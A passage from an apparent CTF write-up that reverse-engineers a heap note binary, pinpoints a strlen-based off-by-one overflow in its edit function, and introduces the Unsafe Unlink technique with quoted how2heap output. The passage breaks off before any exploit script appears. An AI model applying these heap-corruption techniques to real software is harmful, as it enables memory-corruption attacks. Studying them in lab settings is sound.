</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">print_menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">edit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">delete</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">allocate</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Quite simple, it calls <code>print_menu</code> and then read the integer and depending on what option we choose, it calls the function, the only function which stands out for the interest here is <code>allocate</code>, <code>edit</code> and <code>delete</code> as this is the core functions of the binary, let&rsquo;s check those out.</p>
<blockquote>
<p>NOTE: I have named the functions to more readable names, so it&rsquo;ll help in understanding rest of the code.</p>
</blockquote>
<p>Let&rsquo;s check the <code>allocate</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">allocate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">nptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Too many notes!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read_string</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Malloc error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span> <span class="mi">6LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Success!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, first of it checks if the total number of allocated notes is not more than 15, if it is not then it reads the size and then it allocates a chunk of <code>size</code> given, with the index of the note stored in the gloabl variable named <code>ptr</code>. For example, if none of the note has been allocated and given size is <code>0x40</code>, the <code>allocate </code>function will do <code>malloc(0x40)</code> then it address of the allocated chunk will be stored at <code>ptr[0] = &amp;allocated_chunk</code>.</p>
<p>Now, it doesn&rsquo;t do much stuff which seems to be of interest, so let&rsquo;s move on the <code>delete</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="n">ptr</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No double-free for you!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out of bounds!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It reads the the index of the chunk smartly since it checks for the negative and OOB index and then it checks if there is a chunk which is not NULL&rsquo;d already, if it&rsquo;s not then it <code>free</code>&rsquo;s the allocated chunk and makes the <code>ptr[index] = 0</code> making the UAF out of option. But clearly, it didn&rsquo;t NULL&rsquo;d the <code>free</code>&rsquo;d region, so maybe it&rsquo;ll be useful later.</p>
<p>Lastly, we will check the <code>edit</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST08_8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">read_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">v2</span><span class="p">],</span> <span class="n">v0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No UAF for you!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out of bounds!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>There&rsquo;s something fishy here, first the length for the <code>read_string</code> is calculated by <code>strlen</code> and then it is reading the data into the allocated memory. So, what is the catch here? To be more subtle, we have to know that <code>strlen</code> decided the length of a string when a NULL byte is recognized, for example if we have a string <code>HELLO\x00</code>, here it has a NULL Byte in the end, so when <code>strlen(&quot;HELLO\x00&quot;)</code> would be done, the returning value will be 5. but what if the string is not terminated by NULL byte, now since we know that in the <code>edit</code> the length for the <code>read_string</code>, since the string is not terminated by the NULL byte as we see in the <code>read_string</code> below:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">read_string</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Read error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now, it&rsquo;ll calculate the data only if when the NULL byte will be encountered, there&rsquo;s a off by one(kind of) vulnerability we can use. Without further ado, let&rsquo;s move on.</p>
<h1 id="unsafe-unlink" class="relative group">Unsafe Unlink <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#unsafe-unlink" aria-label="Anchor">#</a></span></h1><p>To get along with this, since the given hint was <code>Xenial Xerus</code> which is the name of the <code>Ubuntu 16.04</code> which uses the LIBC-2.23 which, i back then had many low security checks for the heap internals, taking advantage of one of these loose checks within the <code>malloc.c</code>, we will be seeing it soon enough, the technique we will use here would be <code>Unsafe Unlink</code>, first of we will see what it is and how we will use it. To be precise, it is used when we have the global pointer address is known, in this case it&rsquo;d be <code>ptr</code>, to understand it more, we will be seeing it in practice in next section, this is more of just an introduction to unlink. So, first of all, we see the following example of the <code>Unsafe Unlink</code> from <code>how2heap</code> repository:-</p>
<blockquote>
<p>NOTE: This technique is not applicable on fastbin chunks.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[16:11:19]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">glibc_2.25</span> <span class="p">(</span><span class="no">master</span> <span class="err">%</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">.</span><span class="err">/</span><span class="no">unsafe_unlink</span> 
</span></span><span class="line"><span class="cl"><span class="no">Welcome</span> <span class="no">to</span> <span class="no">unsafe</span> <span class="no">unlink</span> <span class="mi">2</span><span class="no">.0</span><span class="p">!</span>
</span></span><span class="line"><span class="cl"><span class="nf">Tested</span> <span class="no">in</span> <span class="no">Ubuntu</span> <span class="mi">14</span><span class="no">.04</span><span class="err">/</span><span class="mi">16</span><span class="no">.04</span> <span class="mi">64</span><span class="no">bit.</span>
</span></span><span class="line"><span class="cl"><span class="nf">This</span> <span class="no">technique</span> <span class="no">can</span> <span class="no">be</span> <span class="no">used</span> <span class="no">when</span> <span class="no">you</span> <span class="no">have</span> <span class="no">a</span> <span class="no">pointer</span> <span class="no">at</span> <span class="no">a</span> <span class="no">known</span> <span class="no">location</span> <span class="no">to</span> <span class="no">a</span> <span class="no">region</span> <span class="no">you</span> <span class="no">can</span> <span class="no">call</span> <span class="no">unlink</span> <span class="no">on.</span>
</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">most</span> <span class="no">common</span> <span class="no">scenario</span> <span class="no">is</span> <span class="no">a</span> <span class="no">vulnerable</span> <span class="no">buffer</span> <span class="no">that</span> <span class="no">can</span> <span class="no">be</span> <span class="no">overflown</span> <span class="no">and</span> <span class="no">has</span> <span class="no">a</span> <span class="no">global</span> <span class="no">pointer.</span>
</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">point</span> <span class="no">of</span> <span class="no">this</span> <span class="no">exercise</span> <span class="no">is</span> <span class="no">to</span> <span class="no">use</span> <span class="no">free</span> <span class="no">to</span> <span class="no">corrupt</span> <span class="no">the</span> <span class="no">global</span> <span class="no">chunk0_ptr</span> <span class="no">to</span> <span class="no">achieve</span> <span class="no">arbitrary</span> <span class="no">memory</span> <span class="no">write.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">global</span> <span class="no">chunk0_ptr</span> <span class="no">is</span> <span class="no">at</span> <span class="mi">0x602070</span><span class="p">,</span> <span class="no">pointing</span> <span class="no">to</span> <span class="mi">0x12ee010</span>
</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">victim</span> <span class="no">chunk</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">corrupt</span> <span class="no">is</span> <span class="no">at</span> <span class="mi">0x12ee0a0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">create</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">inside</span> <span class="no">chunk0.</span>
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">setup</span> <span class="no">the</span> <span class="err">&#39;</span><span class="no">next_free_chunk</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">fd</span><span class="p">)</span> <span class="no">of</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">to</span> <span class="no">point</span> <span class="no">near</span> <span class="no">to</span> <span class="err">&amp;</span><span class="no">chunk0_ptr</span> <span class="no">so</span> <span class="no">that</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">fd-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="err">=</span> <span class="no">P.</span>
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">setup</span> <span class="no">the</span> <span class="err">&#39;</span><span class="no">previous_free_chunk</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">bk</span><span class="p">)</span> <span class="no">of</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">to</span> <span class="no">point</span> <span class="no">near</span> <span class="no">to</span> <span class="err">&amp;</span><span class="no">chunk0_ptr</span> <span class="no">so</span> <span class="no">that</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="err">=</span> <span class="no">P.</span>
</span></span><span class="line"><span class="cl"><span class="nf">With</span> <span class="no">this</span> <span class="no">setup</span> <span class="no">we</span> <span class="no">can</span> <span class="no">pass</span> <span class="no">this</span> <span class="no">check</span><span class="p">:</span> <span class="p">(</span><span class="no">P-</span><span class="err">&gt;</span><span class="no">fd-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span> <span class="err">||</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span><span class="p">)</span> <span class="err">==</span> <span class="no">False</span>
</span></span><span class="line"><span class="cl"><span class="nf">Fake</span> <span class="no">chunk</span> <span class="no">fd</span><span class="p">:</span> <span class="mi">0x602058</span>
</span></span><span class="line"><span class="cl"><span class="nf">Fake</span> <span class="no">chunk</span> <span class="no">bk</span><span class="p">:</span> <span class="mi">0x602060</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">assume</span> <span class="no">that</span> <span class="no">we</span> <span class="no">have</span> <span class="no">an</span> <span class="no">overflow</span> <span class="no">in</span> <span class="no">chunk0</span> <span class="no">so</span> <span class="no">that</span> <span class="no">we</span> <span class="no">can</span> <span class="no">freely</span> <span class="no">change</span> <span class="no">chunk1</span> <span class="no">metadata.</span>
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">shrink</span> <span class="no">the</span> <span class="no">size</span> <span class="no">of</span> <span class="no">chunk0</span> <span class="p">(</span><span class="no">saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">previous_size</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">chunk1</span><span class="p">)</span> <span class="no">so</span> <span class="no">that</span> <span class="no">free</span> <span class="no">will</span> <span class="no">think</span> <span class="no">that</span> <span class="no">chunk0</span> <span class="no">starts</span> <span class="no">where</span> <span class="no">we</span> <span class="no">placed</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk.</span>
</span></span><span class="line"><span class="cl"><span class="nf">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">important</span> <span class="no">that</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">begins</span> <span class="no">exactly</span> <span class="no">where</span> <span class="no">the</span> <span class="no">known</span> <span class="no">pointer</span> <span class="no">points</span> <span class="no">and</span> <span class="no">that</span> <span class="no">we</span> <span class="no">shrink</span> <span class="no">the</span> <span class="no">chunk</span> <span class="no">accordingly</span>
</span></span><span class="line"><span class="cl"><span class="nf">If</span> <span class="no">we</span> <span class="no">had</span> <span class="err">&#39;</span><span class="no">normally</span><span class="err">&#39;</span> <span class="no">freed</span> <span class="no">chunk0</span><span class="p">,</span> <span class="no">chunk1.previous_size</span> <span class="no">would</span> <span class="no">have</span> <span class="no">been</span> <span class="mi">0x90</span><span class="p">,</span> <span class="no">however</span> <span class="no">this</span> <span class="no">is</span> <span class="no">its</span> <span class="no">new</span> <span class="no">value</span><span class="p">:</span> <span class="mi">0x80</span>
</span></span><span class="line"><span class="cl"><span class="nf">We</span> <span class="no">mark</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span> <span class="no">as</span> <span class="no">free</span> <span class="no">by</span> <span class="no">setting</span> <span class="err">&#39;</span><span class="no">previous_in_use</span><span class="err">&#39;</span> <span class="no">of</span> <span class="no">chunk1</span> <span class="no">as</span> <span class="no">False.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Now</span> <span class="no">we</span> <span class="no">free</span> <span class="no">chunk1</span> <span class="no">so</span> <span class="no">that</span> <span class="no">consolidate</span> <span class="no">backward</span> <span class="no">will</span> <span class="no">unlink</span> <span class="no">our</span> <span class="no">fake</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">overwriting</span> <span class="no">chunk0_ptr.</span>
